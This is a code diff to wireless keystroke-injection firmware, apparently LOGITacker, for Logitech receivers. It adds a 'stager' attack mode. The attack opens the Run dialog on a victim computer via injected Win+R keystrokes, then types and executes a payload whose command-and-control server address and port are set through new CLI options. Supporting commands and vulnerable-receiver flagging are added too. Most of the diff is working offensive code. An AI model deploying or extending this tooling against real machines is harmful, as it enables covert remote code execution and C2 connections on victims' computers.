@@ -64,6 +64,35 @@ void deploy_covert_channel_script(bool hide) {
     logitacker_script_engine_append_task_type_string(chunk);
 }
 
+void deploy_stager_script(char * c2addr, char * c2port, char * rfaddr, char * payload, char * delay1, char * delay2) {
+    char chunk[129] = {0};
+
+    logitacker_script_engine_flush_tasks();
+
+    logitacker_script_engine_append_task_press_combo("GUI r");
+    logitacker_script_engine_append_task_delay(atoi(delay1));
+
+    // check to replace by snprintf
+    char * payload_c2addr_updated = helper_str_replace(payload, "C2ADDR", c2addr);
+    char * payload_c2port_updated = helper_str_replace(payload_c2addr_updated, "C2PORT", c2port);
+    char * payload_rfaddr_updated = helper_str_replace(payload_c2port_updated, "RFADDR", rfaddr);
+
+    while (strlen(payload_rfaddr_updated) >= 128) {
+        memcpy(chunk, payload_rfaddr_updated, 128); //keep last byte 0x00
+        logitacker_script_engine_append_task_type_string(chunk);
+        payload_rfaddr_updated += 128; //advance pointer
+    }
+
+    memset(chunk,0,129);
+    memcpy(chunk, payload_rfaddr_updated, strlen(payload_rfaddr_updated)); //keep last byte 0x00
+    if(strlen(chunk) >= 2){
+        logitacker_script_engine_append_task_type_string(chunk);
+    }
+
+    logitacker_script_engine_append_task_delay(atoi(delay2));
+    logitacker_script_engine_append_task_press_combo("ENTER");
+}
+
 
 static void stored_devices_str_list_update() {
     m_stored_device_addr_str_list_len = 1;
@@ -270,6 +299,7 @@ static void print_logitacker_device_info(nrf_cli_t const * p_cli, const logitack
     nrf_cli_vt100_color_t outcol = NRF_CLI_VT100_COLOR_DEFAULT;
     if (dev_is_logitech) outcol = NRF_CLI_VT100_COLOR_BLUE;
     //if (p_device->vuln_forced_pairing) outcol = NRF_CLI_VT100_COLOR_YELLOW;
+    if (p_device->potential_vuln_plain_injection || p_device->potential_vuln_plain_injection_confirmed) outcol = NRF_CLI_VT100_COLOR_YELLOW;
     if (p_device->vuln_plain_injection) outcol = NRF_CLI_VT100_COLOR_GREEN;
     if (p_device->key_known) outcol = NRF_CLI_VT100_COLOR_RED;
 
@@ -319,6 +349,13 @@ static void print_logitacker_device_info(nrf_cli_t const * p_cli, const logitack
     nrf_cli_fprintf(p_cli, outcol, " dongle WPID: 0x%.2x%.2x", p_dongle->wpid[0], p_dongle->wpid[1]);
     if (p_dongle->is_nordic) nrf_cli_fprintf(p_cli, outcol, " (Nordic)");
     if (p_dongle->is_texas_instruments) nrf_cli_fprintf(p_cli, outcol, " (Texas Instruments)");
+    if (!p_dongle->is_texas_instruments && !p_dongle->is_nordic && p_device->potential_vuln_plain_injection_confirmed) {
+        nrf_cli_fprintf(p_cli, outcol, " (Nano Receiver)");
+    } else {
+        if (!p_dongle->is_texas_instruments && !p_dongle->is_nordic && p_device->potential_vuln_plain_injection) {
+            nrf_cli_fprintf(p_cli, outcol, " (Nano Receiver ? active_enum %s)", tmp_addr_str);
+	}
+    }
     nrf_cli_fprintf(p_cli, outcol, "\r\n");
 
     if (p_device->key_known) {
@@ -672,8 +709,53 @@ static void cmd_options_inject_lang(nrf_cli_t const *p_cli, size_t argc, char **
 
 }
 
+static void cmd_options_stager_c2addr(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    if (argc > 1)
+    {
+        strcpy(g_logitacker_global_config.stager_c2addr, argv[1]);
+    }
+
+    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "stager c2addr: %s\r\n", g_logitacker_global_config.stager_c2addr);
+}
+
+static void cmd_options_stager_c2port(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    if (argc > 1)
+    {
+        strcpy(g_logitacker_global_config.stager_c2port, argv[1]);
+    }
+
+    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "stager c2port: %s\r\n", g_logitacker_global_config.stager_c2port);
+}
+
+static void cmd_options_stager_payload(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    if (argc > 1)
+    {
+        strcpy(g_logitacker_global_config.stager_payload, argv[1]);
+    }
+
+    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "stager payload: %s\r\n", g_logitacker_global_config.stager_payload);
+}
+
 static void cmd_script_show(nrf_cli_t const *p_cli, size_t argc, char **argv) {
     logitacker_script_engine_print_current_tasks(p_cli);
+}
+
+static void cmd_options_stager_delay1(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    if (argc > 1)
+    {
+        strcpy(g_logitacker_global_config.stager_delay1, argv[1]);
+    }
+
+    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "stager delay1: %s\r\n", g_logitacker_global_config.stager_delay1);
+}
+
+static void cmd_options_stager_delay2(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    if (argc > 1)
+    {
+        strcpy(g_logitacker_global_config.stager_delay2, argv[1]);
+    }
+
+    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "stager delay2: %s\r\n", g_logitacker_global_config.stager_delay2);
 }
 
 static void cmd_script_string(nrf_cli_t const *p_cli, size_t argc, char **argv)
@@ -1218,6 +1300,11 @@ static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
         char tmp_addr_str[16];
         helper_addr_to_hex_str(tmp_addr_str, 5, addr);
         nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting active enumeration for device %s\r\n", tmp_addr_str);
+
+        logitacker_devices_unifying_device_t * p_device = NULL;
+        logitacker_devices_get_device(&p_device, addr);
+        p_device->potential_vuln_plain_injection_confirmed = true;
+
         logitacker_enter_mode_active_enum(addr);
         return;
     } else {
@@ -1346,6 +1433,45 @@ static void cmd_covert_channel_deploy(nrf_cli_t const *p_cli, size_t argc, char 
     }
 }
 
+static void cmd_stager_deploy(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+
+    if (argc > 1)
+    {
+        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);
+
+        char tmp_addr_str[16];
+
+        //parse arg 1 as address
+        uint8_t addr[5];
+        if (strcmp(argv[1], "USB") == 0) {
+            memset(addr,0x00,5);
+            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
+        } else {
+            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
+                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+                return;
+            }
+
+            //char tmp_addr_str[16];
+            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
+            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
+        }
+
+        // deploy stager agent
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load stager client agent script\r\n");
+	deploy_stager_script(g_logitacker_global_config.stager_c2addr, g_logitacker_global_config.stager_c2port, tmp_addr_str, g_logitacker_global_config.stager_payload, g_logitacker_global_config.stager_delay1, g_logitacker_global_config.stager_delay2);
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject stager client agent into target %s\r\n", argv[1]);
+
+        //logitacker_keyboard_map_test();
+        logitacker_enter_mode_injection(addr);
+        logitacker_injection_start_execution(true);
+        return;
+    } else {
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
+        return;
+    }
+}
+
 
 #ifdef CLI_TEST_COMMANDS
 NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_test)
@@ -1463,6 +1589,13 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_covertchannel)
 
 NRF_CLI_CMD_REGISTER(covert_channel, &m_sub_covertchannel, "start covert channel for given device", NULL);
 
+NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_stager)
+{
+        NRF_CLI_CMD(deploy, &m_sub_enum_device_list, "deploy stager agent for given device", cmd_stager_deploy),
+        NRF_CLI_SUBCMD_SET_END
+};
+
+NRF_CLI_CMD_REGISTER(stager, &m_sub_stager, "start stager for given device", NULL);
 
 NRF_CLI_CMD_REGISTER(active_enum, &m_sub_enum_device_list, "start active enumeration of given device", cmd_enum_active);
 NRF_CLI_CMD_REGISTER(passive_enum, &m_sub_enum_device_list, "start passive enumeration of given device", cmd_enum_passive);
@@ -1577,6 +1710,16 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject)
     NRF_CLI_SUBCMD_SET_END
 };
 
+// options stager
+NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_stager)
+{
+    NRF_CLI_CMD(c2addr, NULL, "IP address or domain of the C&C server", cmd_options_stager_c2addr),
+    NRF_CLI_CMD(c2port, NULL, "PORT of the C&C server", cmd_options_stager_c2port),
+    NRF_CLI_CMD(payload, NULL, "payload injected after a `Win + r` keystroke injection. Use C2ADDR, C2PORT, RFADDR as placeholders.", cmd_options_stager_payload),
+    NRF_CLI_CMD(delay1, NULL, "delay (ms) after `Win + r` keystroke injection", cmd_options_stager_delay1),
+    NRF_CLI_CMD(delay2, NULL, "delay (ms) before paylaod execution with `ENTER` keystroke injection", cmd_options_stager_delay2),
+    NRF_CLI_SUBCMD_SET_END
+};
 
 // options global workmode
 NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_workmode)
@@ -1627,6 +1770,8 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options)
     NRF_CLI_CMD(pair-sniff, &m_sub_options_pairsniff, "options for pair sniff mode", cmd_help),
 
     NRF_CLI_CMD(inject, &m_sub_options_inject, "options for inject mode", cmd_help),
+
+    NRF_CLI_CMD(stager, &m_sub_options_stager, "options for stager mode", cmd_help),
 
     NRF_CLI_CMD(global, &m_sub_options_global, "global options", cmd_help),
 
